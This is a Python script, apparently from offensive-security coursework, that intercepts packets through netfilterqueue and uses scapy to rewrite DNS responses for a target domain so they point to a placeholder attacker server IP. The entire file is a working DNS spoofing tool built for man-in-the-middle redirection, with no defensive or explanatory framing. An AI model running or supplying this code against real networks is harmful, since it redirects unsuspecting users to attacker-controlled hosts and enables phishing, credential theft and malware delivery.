#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import time


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.anyweb.com" in qname:
            print("[+] Spoofing DNS...")
            time.sleep(3)
            ans = scapy.DNSRR(rrname=qname, rdata="your_server_ip")
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
